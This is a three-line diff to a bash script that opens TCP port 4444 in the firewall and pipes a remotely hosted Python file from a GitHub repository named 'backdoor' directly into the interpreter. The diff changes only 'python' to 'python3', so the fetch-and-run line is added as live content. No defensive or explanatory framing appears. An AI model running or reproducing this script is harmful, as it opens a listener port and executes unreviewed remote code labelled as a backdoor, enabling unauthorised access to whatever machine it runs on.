@@ -1,3 +1,3 @@
 #!/bin/bash
 firewall-cmd --add-port=4444/tcp
-curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/corelink.py | python
+curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/corelink.py | python3
